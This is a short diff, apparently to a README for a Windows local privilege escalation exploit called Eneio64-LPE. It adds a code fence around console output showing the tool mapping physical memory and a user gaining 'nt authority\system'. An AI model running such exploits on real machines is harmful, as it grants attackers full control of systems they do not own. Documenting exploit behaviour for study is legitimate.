@@ -1,3 +1,4 @@
+```
 C:\Users\Public>.\Eneio64-LPE.exe
 [+] Total physical memory: ~0x7fef2000 bytes
 [+] Mapped physical memory at 000002A3A4FC0000
@@ -27,7 +28,7 @@ Microsoft Windows [Version 10.0.20348.2849]
 C:\Users\Public>whoami
 nt authority\system
 
-
+```
 
 
 For educational use only!
